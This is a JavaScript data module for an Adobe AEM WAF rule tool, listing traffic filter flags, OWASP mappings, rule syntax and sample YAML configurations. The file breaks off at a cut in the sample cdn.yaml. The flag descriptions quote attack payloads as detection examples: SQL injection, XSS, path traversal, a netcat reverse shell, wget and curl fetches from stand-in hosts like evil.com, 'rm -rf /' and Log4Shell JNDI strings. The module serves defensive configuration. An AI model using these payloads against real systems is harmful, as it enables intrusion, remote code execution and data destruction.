// WAF Flags and Rules Data based on Adobe AEM Cloud Service Documentation
// Reference: https://experienceleague.adobe.com/en/docs/experience-manager-cloud-service/content/security/traffic-filter-rules-including-waf
// Tutorial: https://experienceleague.adobe.com/en/docs/experience-manager-learn/cloud-service/security/traffic-filter-and-waf-rules/overview

// ============================================
// RULE CATEGORIES AND LICENSING
// ============================================
export const RULE_CATEGORIES = {
  standard: {
    name: 'Standard Traffic Filter Rules',
    description: 'Prevent abuse such as DoS, DDoS, scraping, or bot activity. Included with Sites and Forms licenses.',
    license: 'Sites/Forms (included)',
    useCases: [
      'Rate limiting IPs making excessive requests',
      'Geo-blocking specific countries',
      'User-agent filtering for bots',
      'Blocking specific paths or patterns'
    ],
    recommendedMode: 'Start with LOG mode, then move to BLOCK mode after validation',
    examples: ['Rate limiting', 'Geo-blocking', 'IP blocking', 'Path blocking']
  },
  waf: {
    name: 'WAF Traffic Filter Rules',
    description: 'Detect and react to sophisticated attack patterns (OWASP Top 10). Provides proactive protection with advanced intelligence to limit false positives.',
    license: 'Extended Security (WAF-DDoS Protection) or Enhanced Security',
    useCases: [
      'SQL injection protection',
      'Cross-site scripting (XSS) prevention',
      'Known attack IP blocking',
      'OWASP Top 10 threat protection'
    ],
    recommendedMode: 'BLOCK mode for ATTACK-FROM-BAD-IP, LOG mode for ATTACK (then switch to BLOCK)',
    examples: ['SQLI detection', 'XSS prevention', 'Log4Shell protection', 'Backdoor detection']
  }
};

// ============================================
// OWASP TOP 10 MAPPING
// ============================================
export const OWASP_TOP_10 = {
  'A01:2021': {
    name: 'Broken Access Control',
    description: 'Access control enforces policy such that users cannot act outside of their intended permissions.',
    wafFlags: ['TRAVERSAL', 'PRIVATEFILE'],
    mitigations: ['Path-based blocking', 'Private file access prevention']
  },
  'A02:2021': {
    name: 'Cryptographic Failures',
    description: 'Failures related to cryptography which often leads to sensitive data exposure.',
    wafFlags: [],
    mitigations: ['HTTPS enforcement', 'Secure headers']
  },
  'A03:2021': {
    name: 'Injection',
    description: 'User-supplied data is not validated, filtered, or sanitized by the application.',
    wafFlags: ['SQLI', 'XSS', 'CMDEXE', 'CMDEXE-NO-BIN', 'LOG4J-JNDI', 'NULLBYTE'],
    mitigations: ['SQL Injection detection', 'XSS prevention', 'Command injection blocking']
  },
  'A04:2021': {
    name: 'Insecure Design',
    description: 'Missing or ineffective control design.',
    wafFlags: [],
    mitigations: ['Rate limiting', 'Input validation']
  },
  'A05:2021': {
    name: 'Security Misconfiguration',
    description: 'Missing appropriate security hardening across any part of the application stack.',
    wafFlags: ['PRIVATEFILE', 'BACKDOOR'],
    mitigations: ['Private file blocking', 'Backdoor detection']
  },
  'A06:2021': {
    name: 'Vulnerable and Outdated Components',
    description: 'Using components with known vulnerabilities.',
    wafFlags: ['LOG4J-JNDI', 'SANS'],
    mitigations: ['Log4Shell protection', 'Known vulnerability pattern detection']
  },
  'A07:2021': {
    name: 'Identification and Authentication Failures',
    description: 'Authentication and session management weaknesses.',
    wafFlags: ['NOUA', 'USERAGENT'],
    mitigations: ['Bot detection', 'User-agent validation']
  },
  'A08:2021': {
    name: 'Software and Data Integrity Failures',
    description: 'Code and infrastructure that does not protect against integrity violations.',
    wafFlags: ['BACKDOOR'],
    mitigations: ['Backdoor/webshell detection']
  },
  'A09:2021': {
    name: 'Security Logging and Monitoring Failures',
    description: 'Without logging and monitoring, breaches cannot be detected.',
    wafFlags: [],
    mitigations: ['Enable alert notifications', 'Use LOG mode for analysis']
  },
  'A10:2021': {
    name: 'Server-Side Request Forgery (SSRF)',
    description: 'SSRF flaws occur when fetching a remote resource without validating the user-supplied URL.',
    wafFlags: ['ATTACK'],
    mitigations: ['General attack pattern detection']
  }
};

// ============================================
// WAF FLAGS
// ============================================
export const WAF_FLAGS = {
  // Recommended New Flags (July 2025+)
  'ATTACK-FROM-BAD-IP': {
    name: 'ATTACK-FROM-BAD-IP',
    category: 'Threat Intelligence',
    severity: 'critical',
    description: 'Attack from known malicious IP - Blocks attacks that BOTH match suspicious patterns AND originate from IPs with malicious history. Safe to use in BLOCK mode immediately due to very low false positive rate.',
    examples: [
      "Known botnet IP addresses",
      "Previously flagged attack sources",
      "Malicious hosting providers",
      "Compromised server IPs"
    ],
    attackType: 'Known Malicious Source + Attack Pattern',
    mitigates: 'Blocks traffic from IPs with established malicious reputation combined with attack patterns',
    license: 'Extended Security',
    recommended: true,
    recommendedAction: 'block',
    deploymentNote: 'Safe to deploy in BLOCK mode immediately. This flag has inherent dual validation (attack pattern + bad IP) minimizing false positives.',
    owaspMapping: ['A03:2021', 'A10:2021']
  },
  ATTACK: {
    name: 'ATTACK',
    category: 'General',
    severity: 'high',
    description: 'General attack pattern detection - Catches various attack signatures from any IP. Adobe experience indicates false positives are rare, but recommend starting in LOG mode.',
    examples: [
      "Multiple combined attack vectors",
      "Novel attack patterns",
      "Obfuscated attack attempts",
      "General suspicious behavior"
    ],
    attackType: 'General Attack Patterns',
    mitigates: 'Broad protection against various attack techniques',
    license: 'Extended Security',
    recommended: true,
    recommendedAction: 'log',
    deploymentNote: 'Start in LOG mode. Analyze CDN logs to verify no legitimate traffic is flagged. Switch to BLOCK after validation.',
    owaspMapping: ['A03:2021', 'A10:2021']
  },
  
  // Legacy Flags (Still Valid and Effective)
  SQLI: {
    name: 'SQLI',
    category: 'Injection',
    severity: 'critical',
    description: 'SQL Injection detection - Blocks requests containing SQL injection attack patterns targeting database queries.',
    examples: [
      "' OR '1'='1",
      "1; DROP TABLE users--",
      "UNION SELECT * FROM passwords",
      "'; DELETE FROM users WHERE '1'='1"
    ],
    attackType: 'SQL Injection',
    mitigates: 'Prevents attackers from manipulating database queries to access or modify unauthorized data',
    license: 'Extended Security',
    owaspMapping: ['A03:2021']
  },
  XSS: {
    name: 'XSS',
    category: 'Injection',
    severity: 'high',
    description: 'Cross-Site Scripting detection - Blocks requests containing XSS attack patterns that could inject malicious scripts.',
    examples: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>"
    ],
    attackType: 'Cross-Site Scripting',
    mitigates: 'Prevents injection of malicious scripts that could steal user data or hijack sessions',
    license: 'Extended Security',
    owaspMapping: ['A03:2021']
  },
  TRAVERSAL: {
    name: 'TRAVERSAL',
    category: 'Path Manipulation',
    severity: 'high',
    description: 'Directory/Path Traversal detection - Blocks requests attempting to access files outside the intended web root directory.',
    examples: [
      "../../../etc/passwd",
      "..\\..\\windows\\system32",
      "%2e%2e%2f%2e%2e%2f",
      "....//....//etc/passwd"
    ],
    attackType: 'Path Traversal',
    mitigates: 'Prevents unauthorized access to system files and sensitive configuration data',
    license: 'Extended Security',
    owaspMapping: ['A01:2021', 'A03:2021']
  },
  CMDEXE: {
    name: 'CMDEXE',
    category: 'Command Execution',
    severity: 'critical',
    description: 'Command Execution detection - Blocks requests containing OS command injection patterns that could execute system commands.',
    examples: [
      "; ls -la",
      "| cat /etc/passwd",
      "`whoami`",
      "$(wget http://malicious.com/shell.sh)"
    ],
    attackType: 'Command Injection',
    mitigates: 'Prevents execution of arbitrary system commands on the server',
    license: 'Extended Security',
    owaspMapping: ['A03:2021']
  },
  'CMDEXE-NO-BIN': {
    name: 'CMDEXE-NO-BIN',
    category: 'Command Execution',
    severity: 'high',
    description: 'Command Execution detection excluding binary paths - More targeted command injection detection with fewer false positives than CMDEXE.',
    examples: [
      "; rm -rf /",
      "| nc -e /bin/sh",
      "&& curl malicious.com",
      "|| wget evil.com/backdoor"
    ],
    attackType: 'Command Injection (No Binary)',
    mitigates: 'Targeted protection against command injection without binary path patterns',
    license: 'Extended Security',
    owaspMapping: ['A03:2021']
  },
  'LOG4J-JNDI': {
    name: 'LOG4J-JNDI',
    category: 'Remote Code Execution',
    severity: 'critical',
    description: 'Log4j JNDI Injection detection (CVE-2021-44228) - Blocks Log4Shell exploit attempts that can lead to remote code execution.',
    examples: [
      "${jndi:ldap://evil.com/a}",
      "${jndi:rmi://attacker.com/obj}",
      "${${lower:j}ndi:ldap://x.x.x.x/a}",
      "${jndi:dns://callback.evil.com}"
    ],
    attackType: 'Log4Shell / JNDI Injection',
    mitigates: 'Prevents exploitation of the critical Log4j vulnerability for remote code execution',
    license: 'Extended Security',
    owaspMapping: ['A03:2021', 'A06:2021']
  },
  BACKDOOR: {
    name: 'BACKDOOR',
    category: 'Malware',
    severity: 'critical',
    description: 'Backdoor detection - Blocks requests matching known backdoor signatures, webshell patterns, and malicious file access attempts.',
    examples: [
      "c99shell",
      "r57shell",
      "WSO webshell access",
      "FilesMan backdoor"
    ],
    attackType: 'Backdoor/Webshell',
    mitigates: 'Prevents access to or deployment of malicious backdoor scripts',
    license: 'Extended Security',
    owaspMapping: ['A05:2021', 'A08:2021']
  },
  USERAGENT: {
    name: 'USERAGENT',
    category: 'Bot Detection',
    severity: 'medium',
    description: 'Malicious User-Agent detection - Blocks requests from known malicious tools, vulnerability scanners, and attack frameworks.',
    examples: [
      "sqlmap/1.0",
      "Nikto",
      "masscan",
      "ZmEu"
    ],
    attackType: 'Malicious Bot/Scanner',
    mitigates: 'Blocks automated attack tools and vulnerability scanners',
    license: 'Extended Security',
    owaspMapping: ['A07:2021']
  },
  SANS: {
    name: 'SANS',
    category: 'Threat Intelligence',
    severity: 'high',
    description: 'SANS Top Attack patterns - Blocks requests matching SANS-identified common attack vectors based on global threat intelligence.',
    examples: [
      "Common exploit patterns",
      "Known CVE exploitation attempts",
      "Frequent attack signatures",
      "Top vulnerability exploits"
    ],
    attackType: 'Common Attack Patterns',
    mitigates: 'Protection against most common attack vectors identified by SANS',
    license: 'Extended Security',
    owaspMapping: ['A06:2021']
  },
  TORNODE: {
    name: 'TORNODE',
    category: 'Anonymization',
    severity: 'medium',
    description: 'Tor Exit Node detection - Blocks requests originating from known Tor exit nodes, commonly used to anonymize malicious activity.',
    examples: [
      "Traffic from Tor network",
      "Anonymous proxy requests",
      "Dark web originated traffic"
    ],
    attackType: 'Tor Network Traffic',
    mitigates: 'Blocks anonymized traffic commonly used to hide malicious activity',
    license: 'Extended Security'
  },
  NOUA: {
    name: 'NOUA',
    category: 'Bot Detection',
    severity: 'low',
    description: 'No User-Agent detection - Blocks requests without a User-Agent header, which typically indicates automated/bot traffic.',
    examples: [
      "curl without -A flag",
      "wget default requests",
      "Custom scripts without UA",
      "Empty User-Agent header"
    ],
    attackType: 'Missing User-Agent',
    mitigates: 'Blocks automated requests that lack proper browser identification',
    license: 'Extended Security',
    owaspMapping: ['A07:2021']
  },
  SCANNER: {
    name: 'SCANNER',
    category: 'Bot Detection',
    severity: 'medium',
    description: 'Security Scanner detection - Blocks requests from vulnerability scanners and automated security testing tools.',
    examples: [
      "Nessus scans",
      "Acunetix requests",
      "OWASP ZAP traffic",
      "Burp Suite scans"
    ],
    attackType: 'Vulnerability Scanner',
    mitigates: 'Prevents automated security scanning and reconnaissance',
    license: 'Extended Security'
  },
  PRIVATEFILE: {
    name: 'PRIVATEFILE',
    category: 'Data Protection',
    severity: 'high',
    description: 'Private File access detection - Blocks access to sensitive configuration files, hidden files, and system files.',
    examples: [
      ".htaccess",
      ".git/config",
      "wp-config.php",
      ".env files"
    ],
    attackType: 'Sensitive File Access',
    mitigates: 'Prevents exposure of configuration files and sensitive data',
    license: 'Extended Security',
    owaspMapping: ['A01:2021', 'A05:2021']
  },
  NULLBYTE: {
    name: 'NULLBYTE',
    category: 'Evasion',
    severity: 'high',
    description: 'Null Byte Injection detection - Blocks requests containing null byte injection attempts used to bypass file extension filters.',
    examples: [
      "file.php%00.jpg",
      "document.txt\\0.exe",
      "%00 bypass attempts",
      "Null character injection"
    ],
    attackType: 'Null Byte Injection',
    mitigates: 'Prevents file extension bypass and filter evasion attacks',
    license: 'Extended Security',
    owaspMapping: ['A03:2021']
  }
};

export const SEVERITY_COLORS = {
  critical: { bg: 'rgba(227, 72, 80, 0.15)', color: '#ec5b62' },
  high: { bg: 'rgba(230, 134, 25, 0.15)', color: '#f29423' },
  medium: { bg: 'rgba(38, 128, 235, 0.15)', color: '#378ef0' },
  low: { bg: 'rgba(45, 157, 120, 0.15)', color: '#33ab84' }
};

export const CATEGORIES = [
  'Injection',
  'Path Manipulation',
  'Command Execution',
  'Remote Code Execution',
  'Malware',
  'Bot Detection',
  'Threat Intelligence',
  'Anonymization',
  'Data Protection',
  'Evasion',
  'General'
];

// ============================================
// RULES SYNTAX
// ============================================
export const RULES_SYNTAX = {
  properties: {
    name: {
      required: true,
      type: 'string',
      maxLength: 64,
      description: 'Rule name - must be unique and max 64 characters. Can only contain alphanumerics and dashes.',
      example: 'block-sql-injection'
    },
    when: {
      required: true,
      type: 'object',
      description: 'Condition that determines when the rule should be evaluated. Can contain nested conditions using allOf/anyOf.',
      properties: {
        reqProperty: {
          type: 'string',
          description: 'Request property to match against',
          values: ['path', 'queryString', 'method', 'tier', 'domain', 'clientIp', 'clientCountry', 'clientAsn', 'userAgent']
        },
        reqHeader: {
          type: 'string',
          description: 'Request header to match against (e.g., Host, User-Agent, X-Forwarded-For)'
        },
        queryParam: {
          type: 'string',
          description: 'Query parameter name to match against'
        },
        allOf: {
          type: 'array',
          description: 'ALL conditions must match (AND logic)'
        },
        anyOf: {
          type: 'array',
          description: 'ANY condition must match (OR logic)'
        }
      }
    },
    action: {
      required: true,
      type: 'string|object',
      description: 'Action to take when rule matches. Can be simple string ("block", "log", "allow") or object with type and wafFlags.',
      values: ['block', 'log', 'allow'],
      properties: {
        type: {
          type: 'string',
          values: ['block', 'log', 'allow'],
          description: 'Action type'
        },
        wafFlags: {
          type: 'array',
          description: 'WAF flags to enable (requires Extended Security license)',
          requiresLicense: true
        }
      }
    },
    rateLimit: {
      required: false,
      type: 'object',
      description: 'Rate limiting configuration',
      properties: {
        limit: {
          type: 'number',
          description: 'Maximum number of requests allowed in the time window'
        },
        window: {
          type: 'number',
          description: 'Time window in seconds (1-120)'
        },
        count: {
          type: 'string',
          values: ['all', 'fetches', 'errors'],
          description: 'What to count - all requests, only origin fetches, or errors',
          default: 'all'
        },
        penalty: {
          type: 'number',
          description: 'How long (in seconds) to block the client after exceeding the limit'
        },
        groupBy: {
          type: 'array',
          description: 'Properties to group rate limiting by (e.g., clientIp, clientAsn)',
          values: ['clientIp', 'clientAsn', 'clientCountry']
        }
      }
    },
    alert: {
      required: false,
      type: 'boolean',
      description: 'Whether to send alert notifications when this rule triggers',
      default: false
    }
  },
  operators: {
    equals: {
      description: 'Exact string match',
      example: '{ reqProperty: path, equals: "/admin" }',
      useCase: 'Block exact path'
    },
    notEquals: {
      description: 'Does not equal',
      example: '{ reqProperty: tier, notEquals: "author" }',
      useCase: 'Apply to all tiers except author'
    },
    like: {
      description: 'Wildcard pattern match using * for any characters',
      example: '{ reqProperty: path, like: "/api/*" }',
      useCase: 'Match paths starting with /api/'
    },
    notLike: {
      description: 'Does not match wildcard pattern',
      example: '{ reqProperty: path, notLike: "*.html" }',
      useCase: 'Exclude HTML files'
    },
    matches: {
      description: 'Regular expression match (Java regex syntax)',
      example: '{ reqProperty: path, matches: "^/content/.*\\.json$" }',
      useCase: 'Match complex patterns'
    },
    in: {
      description: 'Value is in provided list',
      example: '{ reqProperty: clientCountry, in: ["US", "CA", "GB"] }',
      useCase: 'Allow specific countries'
    },
    notIn: {
      description: 'Value is not in provided list',
      example: '{ reqProperty: method, notIn: ["GET", "HEAD"] }',
      useCase: 'Block non-read methods'
    }
  },
  requestProperties: {
    path: {
      description: 'The request URI path without query string',
      example: '/content/dam/image.jpg'
    },
    queryString: {
      description: 'The query string portion of the URL',
      example: '?id=123&sort=asc'
    },
    method: {
      description: 'HTTP method (GET, POST, PUT, DELETE, etc.)',
      example: 'GET'
    },
    tier: {
      description: 'AEM tier - "author" or "publish"',
      example: 'publish'
    },
    domain: {
      description: 'The request domain/hostname',
      example: 'www.example.com'
    },
    clientIp: {
      description: 'The client IP address',
      example: '192.168.1.100'
    },
    clientCountry: {
      description: 'Two-letter ISO 3166-1 alpha-2 country code',
      example: 'US'
    },
    clientAsn: {
      description: 'Autonomous System Number of the client network',
      example: '15169 (Google)'
    },
    userAgent: {
      description: 'The User-Agent header value',
      example: 'Mozilla/5.0...'
    }
  }
};

export const ACTION_TYPES = [
  { value: 'block', label: 'Block', description: 'Immediately block the request with 403 Forbidden response', color: 'red' },
  { value: 'log', label: 'Log', description: 'Log the request for analysis but allow it to pass through. Recommended for initial deployment.', color: 'blue' },
  { value: 'allow', label: 'Allow', description: 'Explicitly allow the request, bypassing subsequent rules', color: 'green' }
];

export const TIER_OPTIONS = [
  { value: 'publish', label: 'Publish', description: 'Public-facing publish tier for end users' },
  { value: 'author', label: 'Author', description: 'Content authoring tier for editors' },
  { value: 'both', label: 'Both (Author & Publish)', description: 'Apply rule to all tiers' }
];

export const REQUEST_PROPERTIES = [
  { value: 'path', label: 'Path', description: 'Request URL path (e.g., /content/page.html)', example: '/content/dam/*.json' },
  { value: 'queryString', label: 'Query String', description: 'URL query parameters', example: '?debug=true' },
  { value: 'method', label: 'Method', description: 'HTTP method (GET, POST, PUT, DELETE)', example: 'POST' },
  { value: 'clientIp', label: 'Client IP', description: 'Client IP address', example: '192.168.1.100' },
  { value: 'clientCountry', label: 'Client Country', description: 'ISO 3166-1 alpha-2 country code', example: 'US' },
  { value: 'clientAsn', label: 'Client ASN', description: 'Autonomous System Number', example: '15169' },
  { value: 'domain', label: 'Domain', description: 'Request hostname', example: 'www.example.com' },
  { value: 'userAgent', label: 'User Agent', description: 'Browser/client identifier', example: 'Mozilla/5.0...' },
  { value: 'tier', label: 'Tier', description: 'AEM tier (author/publish)', example: 'publish' }
];

export const HEADER_PROPERTIES = [
  { value: 'Host', label: 'Host', description: 'Request host header' },
  { value: 'User-Agent', label: 'User-Agent', description: 'Client user agent string' },
  { value: 'Referer', label: 'Referer', description: 'Request referrer header' },
  { value: 'Content-Type', label: 'Content-Type', description: 'Request content type' },
  { value: 'X-Forwarded-For', label: 'X-Forwarded-For', description: 'Original client IP (proxy)' },
  { value: 'Authorization', label: 'Authorization', description: 'Auth credentials header' }
];

export const MATCH_OPERATORS = [
  { value: 'equals', label: 'Equals', description: 'Exact match', syntax: '{ reqProperty: path, equals: "/admin" }' },
  { value: 'notEquals', label: 'Not Equals', description: 'Does not equal', syntax: '{ reqProperty: tier, notEquals: "author" }' },
  { value: 'like', label: 'Like (Wildcard)', description: 'Pattern match with * wildcard', syntax: '{ reqProperty: path, like: "/api/*" }' },
  { value: 'notLike', label: 'Not Like', description: 'Does not match pattern', syntax: '{ reqProperty: path, notLike: "*.html" }' },
  { value: 'matches', label: 'Matches (Regex)', description: 'Regular expression (Java syntax)', syntax: '{ reqProperty: path, matches: "^/content/.*" }' },
  { value: 'in', label: 'In (List)', description: 'Value is in array', syntax: '{ reqProperty: clientCountry, in: ["US", "CA"] }' },
  { value: 'notIn', label: 'Not In', description: 'Value not in array', syntax: '{ reqProperty: method, notIn: ["GET", "HEAD"] }' }
];

export const RATE_LIMIT_COUNT_OPTIONS = [
  { value: 'all', label: 'All Requests', description: 'Count all requests including cached (CDN edge)', targetLayer: 'CDN Edge' },
  { value: 'fetches', label: 'Origin Fetches', description: 'Only count requests that go to origin (cache misses)', targetLayer: 'Origin' },
  { value: 'errors', label: 'Errors Only', description: 'Only count error responses (4xx, 5xx)', targetLayer: 'Any' }
];

export const OFAC_COUNTRIES = [
  { code: 'SY', name: 'Syria' },
  { code: 'BY', name: 'Belarus' },
  { code: 'MM', name: 'Myanmar' },
  { code: 'KP', name: 'North Korea' },
  { code: 'IQ', name: 'Iraq' },
  { code: 'CD', name: 'Congo (DRC)' },
  { code: 'SD', name: 'Sudan' },
  { code: 'IR', name: 'Iran' },
  { code: 'LR', name: 'Liberia' },
  { code: 'ZW', name: 'Zimbabwe' },
  { code: 'CU', name: 'Cuba' },
  { code: 'CI', name: "Côte d'Ivoire" }
];

// ============================================
// DEPLOYMENT WORKFLOW
// ============================================
export const DEPLOYMENT_WORKFLOW = {
  steps: [
    {
      step: 1,
      title: 'Define Rules in YAML',
      description: 'Create cdn.yaml with traffic filter rules in your config folder',
      action: 'Create/edit cdn.yaml file'
    },
    {
      step: 2,
      title: 'Deploy via Cloud Manager',
      description: 'Use Cloud Manager config pipeline to deploy rules',
      action: 'Run config pipeline'
    },
    {
      step: 3,
      title: 'Start in LOG Mode',
      description: 'Deploy rules with action: log to observe matches without blocking',
      action: 'Monitor CDN logs'
    },
    {
      step: 4,
      title: 'Analyze Results',
      description: 'Use Adobe dashboard tooling to analyze CDN logs for matches and false positives',
      action: 'Review matches'
    },
    {
      step: 5,
      title: 'Switch to BLOCK Mode',
      description: 'After validation, change action: log to action: block',
      action: 'Update and redeploy'
    },
    {
      step: 6,
      title: 'Enable Alerts',
      description: 'Add alert: true to get notified when rules trigger',
      action: 'Configure alerts'
    }
  ],
  exceptions: [
    {
      flag: 'ATTACK-FROM-BAD-IP',
      note: 'Safe to deploy in BLOCK mode immediately due to dual validation (attack pattern + malicious IP)'
    }
  ]
};

// ============================================
// ADVANCED USE CASES
// ============================================
export const ADVANCED_USE_CASES = [
  {
    id: 'monitor-sensitive',
    title: 'Monitoring Sensitive Requests',
    description: 'Log requests to sensitive endpoints for security analysis without blocking legitimate users.',
    category: 'Monitoring',
    yaml: `- name: log-admin-access
  when:
    allOf:
      - { reqProperty: tier, equals: 'publish' }
      - { reqProperty: path, like: '/admin/*' }
  action: log
  alert: true`,
    explanation: 'Logs all requests to /admin/* paths on publish tier. Useful for detecting potential unauthorized access attempts.',
    useCase: 'Security auditing, intrusion detection'
  },
  {
    id: 'restrict-access',
    title: 'Restricting Access by IP/Region',
    description: 'Block or allow access based on client IP address or geographic location.',
    category: 'Access Control',
    yaml: `- name: allow-office-ips
  when:
    allOf:
      - { reqProperty: tier, equals: 'author' }
      - { reqProperty: clientIp, in: ["10.0.0.0/8", "192.168.0.0/16"] }
  action: allow`,
    explanation: 'Explicitly allows internal IP ranges to access author tier. Allow rules are processed before block rules.',
    useCase: 'IP whitelisting, internal access control'
  },
  {
    id: 'block-methods',
    title: 'Blocking HTTP Methods',
    description: 'Restrict write methods on publish tier for read-only content delivery.',
    category: 'Method Restriction',
    yaml: `- name: block-write-methods
  when:
    allOf:
      - { reqProperty: tier, equals: 'publish' }
      - { reqProperty: method, notIn: ["GET", "HEAD", "OPTIONS"] }
  action: block`,
    explanation: 'Blocks POST, PUT, DELETE methods on publish tier. Publish should typically only serve content.',
    useCase: 'Read-only content delivery, prevent data modification'
  },
  {
    id: 'rate-limit-api',
    title: 'API Rate Limiting',
    description: 'Protect API endpoints from abuse with per-client rate limits.',
    category: 'Rate Limiting',
    yaml: `- name: rate-limit-api
  when:
    allOf:
      - { reqProperty: tier, equals: 'publish' }
      - { reqProperty: path, like: '/api/*' }
  rateLimit:
    limit: 50
    window: 10
    count: all
    penalty: 60
    groupBy:
      - reqProperty: clientIp
  action: log
  alert: true`,
    explanation: 'Limits API calls to 50 requests per 10 seconds per IP. Violators are blocked for 60 seconds.',
    useCase: 'API protection, prevent abuse, fair usage'
  },
  {
    id: 'block-scanners',
    title: 'Blocking Vulnerability Scanners',
    description: 'Block known security scanning tools and automated reconnaissance.',
    category: 'Bot Protection',
    yaml: `- name: block-scanners
  when:
    reqProperty: tier
    in: ["author", "publish"]
  action:
    type: block
    wafFlags:
      - SCANNER
      - USERAGENT
      - NOUA`,
    explanation: 'Combines multiple bot detection flags to block automated scanning tools.',
    useCase: 'Prevent reconnaissance, reduce attack surface'
  },
  {
    id: 'protect-dam',
    title: 'Protecting DAM Assets',
    description: 'Block enumeration of Digital Asset Management paths.',
    category: 'Path Protection',
    yaml: `- name: block-dam-enumeration
  when:
    allOf:
      - { reqProperty: tier, equals: 'publish' }
      - { reqProperty: path, matches: "^/content/dam\\..*\\.json$" }
  action: block`,
    explanation: 'Blocks requests trying to enumerate DAM content via JSON selectors. Uses regex for precise matching.',
    useCase: 'Prevent content enumeration, data exposure'
  }
];

// ============================================
// RECOMMENDED STARTER RULES
// ============================================
export const RECOMMENDED_STARTER_RULES = {
  standard: [
    {
      name: 'limit-origin-requests-client-ip',
      description: 'Rate limit to protect origin server - 100 req/sec limit at ORIGIN layer',
      type: 'rateLimit',
      config: {
        limit: 100,
        window: 10,
        count: 'fetches',
        penalty: 300
      },
      explanation: 'Protects your origin server from being overwhelmed. Only counts requests that reach origin (cache misses). Blocks violating IPs for 5 minutes.',
      layer: 'Origin'
    },
    {
      name: 'limit-requests-client-ip',
      description: 'Rate limit all requests - 500 req/sec limit at CDN EDGE layer',
      type: 'rateLimit',
      config: {
        limit: 500,
        window: 10,
        count: 'all',
        penalty: 300
      },
      alert: true,
      explanation: 'Protects CDN edge from volumetric attacks. Higher threshold since cached responses are included. Enables alerts for visibility.',
      layer: 'CDN Edge'
    },
    {
      name: 'ofac-countries',
      description: 'Block traffic from OFAC sanctioned countries',
      type: 'geoBlock',
      countries: ['SY', 'BY', 'MM', 'KP', 'IQ', 'CD', 'SD', 'IR', 'LR', 'ZW', 'CU', 'CI'],
      explanation: 'Blocks traffic from countries under OFAC (Office of Foreign Assets Control) sanctions. Required for compliance in many organizations.'
    }
  ],
  waf: [
    {
      name: 'attacks-from-bad-ips-globally',
      description: 'Block attacks from known malicious IPs - SAFE to deploy in BLOCK mode',
      wafFlags: ['ATTACK-FROM-BAD-IP'],
      action: 'block',
      explanation: 'This flag only triggers when BOTH an attack pattern is detected AND the IP is known to be malicious. Very low false positive rate makes it safe for immediate blocking.',
      deploymentMode: 'block',
      safeToBlock: true
    },
    {
      name: 'attacks-from-any-ips-globally',
      description: 'Log general attack patterns - Start in LOG mode, validate, then BLOCK',
      wafFlags: ['ATTACK'],
      action: 'log',
      explanation: 'Catches various attack patterns from any IP. Adobe experience shows false positives are rare, but start in LOG mode to validate before blocking.',
      deploymentMode: 'log-then-block',
      safeToBlock: false
    },
    {
      name: 'block-waf-flags-globally',
      description: 'Legacy comprehensive WAF rule - enables all recommended attack detection',
      wafFlags: ['TRAVERSAL', 'CMDEXE-NO-BIN', 'XSS', 'LOG4J-JNDI', 'BACKDOOR', 'USERAGENT', 'SQLI', 'SANS', 'TORNODE', 'NOUA', 'SCANNER', 'PRIVATEFILE', 'NULLBYTE'],
      action: 'log',
      explanation: 'Prior to July 2025, Adobe recommended this comprehensive rule. Still valid and effective for defense-in-depth. Enables protection against 13 attack categories.',
      deploymentMode: 'log-then-block',
      safeToBlock: false
    }
  ]
};

// ============================================
// EXAMPLE RULES
// ============================================
export const EXAMPLE_RULES = [
  {
    name: 'block-path',
    category: 'Path Blocking',
    yaml: `- name: block-path
  when:
    allOf:
      - { reqProperty: tier, matches: "author|publish" }
      - { reqProperty: path, equals: '/block/me' }
  action: block`,
    explanation: 'Blocks access to a specific path on both author and publish tiers. Uses allOf to combine conditions with AND logic.',
  },
  {
    name: 'Enable-SQL-Injection-and-XSS-waf-rules-globally',
    category: 'WAF Protection',
    yaml: `- name: Enable-SQL-Injection-and-XSS-waf-rules-globally
  when: { reqProperty: path, like: "*" }
  action:
    type: block
    wafFlags: [ SQLI, XSS ]`,
    explanation: 'Enables SQL Injection and XSS detection for all paths using wildcard. Requires Extended Security license.',
  },
  {
    name: 'block-specific-ips',
    category: 'IP Blocking',
    yaml: `- name: block-specific-ips
  when:
    reqProperty: clientIp
    in: ["203.0.113.45", "198.51.100.23"]
  action: block`,
    explanation: 'Blocks specific IP addresses. Useful for blocking known attackers identified from log analysis.',
  },
  {
    name: 'allow-specific-ips',
    category: 'IP Allowlist',
    yaml: `- name: allow-specific-ips
  when:
    reqProperty: clientIp
    in: ["10.0.0.0/8", "192.168.0.0/16"]
  action: allow`,
    explanation: 'Explicitly allows internal IP ranges to bypass other rules. Allow rules are processed before block rules.',
  },
  {
    name: 'block-by-user-agent',
    category: 'User Agent Filtering',
    yaml: `- name: block-by-user-agent
  when:
    reqProperty: userAgent
    like: "*curl*"
  action: block`,
    explanation: 'Blocks requests with specific user agent patterns. Useful for blocking automated tools.',
  },
  {
    name: 'block-non-get-methods',
    category: 'Method Restriction',
    yaml: `- name: block-non-get-methods
  when:
    allOf:
      - { reqProperty: tier, equals: publish }
      - { reqProperty: method, notIn: ["GET", "HEAD", "OPTIONS"] }
  action: block`,
    explanation: 'Blocks write methods (POST, PUT, DELETE) on publish tier. Useful for read-only content delivery.',
  },
  {
    name: 'rate-limit-api',
    category: 'Rate Limiting',
    yaml: `- name: rate-limit-api
  when:
    allOf:
      - { reqProperty: tier, equals: publish }
      - { reqProperty: path, like: "/api/*" }
  rateLimit:
    limit: 50
    window: 10
    count: all
    penalty: 60
    groupBy:
      - reqProperty: clientIp
  action: log`,
    explanation: 'Rate limits API endpoints to 50 requests per 10 seconds per IP. Clients exceeding this are blocked for 60 seconds.',
  },
  {
    name: 'block-specific-paths-regex',
    category: 'Path Blocking (Regex)',
    yaml: `- name: block-specific-paths-regex
  when:
    reqProperty: path
    matches: "^/content/dam/.*\\.(json|xml)$"
  action: block`,
    explanation: 'Uses regex to block JSON and XML files under /content/dam/. Note the escaped backslash for regex syntax.',
  }
];

export const SAMPLE_CDN_YAML = `kind: "CDN"
version: "1"
metadata:
  envTypes:
    - dev
    - stage
    - prod
data:
  trafficFilters:
    rules:
      # ================================================
      # STANDARD TRAFFIC FILTER RULES
      # Available with Sites/Forms license (included)
      # ================================================

      # Rate limit at ORIGIN layer - protect backend from traffic spikes
      - name: rate-limit-origin-requests
        when:
          reqProperty: tier
          equals: "publish"
        rateLimit:
          limit: 100
          window: 10
          count: fetches
          penalty: 300
          groupBy:
            - reqProperty: clientIp
        action: log

      # Rate limit at CDN EDGE layer - all requests including cached
